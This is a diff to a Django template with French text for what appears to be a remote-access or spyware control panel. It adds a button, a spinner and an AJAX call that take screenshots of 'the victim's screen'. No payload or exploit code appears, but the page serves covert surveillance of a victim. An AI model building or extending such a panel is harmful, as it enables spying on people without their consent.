@@ -1,9 +1,46 @@
 {% extends "server/session.html" %}
 {% block session_content %}
 
-<p class="mb-4">
-	<a class="btn btn-outline-primary" href="{% url "action_screenshot" id %}">Prendre une capture d'écran</a>
+<p>Vous pouvez prendre des captures d'écran de l'écran de la victime.</p>
+
+{% if len_images == 0 %}
+<div class="alert alert-info" role="alert">
+	Lors de votre première capture, la capture prendra environ plusieurs dizaines de secondes à s'effectuer.
+</div>
+
+<div class="mb-4 text-center" id="button_screenshot_container">
+	<button id="button_screenshot" class="btn btn-outline-primary"><i class="fas fa-camera-retro    "></i> Prendre une capture d'écran</a>
+</div>
+
+<div id="loader" class="text-center mt-5 text-primary" style="display: none">
+	<i class="fas fa-spinner fa-spin fa-3x"></i>
+</div>
+
+<script type="text/javascript">
+	$(function(){
+		function loadScreenshot() {
+			$('#button_screenshot_container').hide();
+			$('#loader').show();
+			$.ajax({
+				url: "{% url "action_screenshot" id %}",
+			}).done(function(result) {
+				window.location.reload();
+			});
+		}
+
+		$('#button_screenshot').on('click', loadScreenshot);
+		
+	});
+</script>
+
+{% else %}
+
+<p class="mb-4 text-center">
+	<a class="btn btn-outline-primary" href="{% url "action_screenshot" id %}"><i class="fas fa-camera-retro    "></i> Prendre une capture d'écran</a>
 </p>
+	
+
+{% endif %}
 
 <div class="container">
 				{% for i in images %}
